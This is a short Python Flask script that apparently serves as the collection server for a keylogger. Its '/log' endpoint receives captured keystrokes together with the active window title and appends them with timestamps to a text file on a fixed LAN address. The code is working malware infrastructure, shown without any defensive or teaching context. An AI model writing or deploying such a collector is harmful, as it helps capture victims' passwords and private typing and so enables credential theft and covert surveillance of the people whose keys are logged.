

from flask import Flask,request
from datetime import datetime


app = Flask(__name__)

@app.route('/log',methods=['POST'])

def log_keys():
    data = request.json
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("windows_logs.txt","a") as f:
        f.write(f"[{timestamp}] {data['window']} > {data['keys']}\n")
    return "OK",200


if __name__ == "__main__":
    app.run(host="192.168.100.14",port=5000)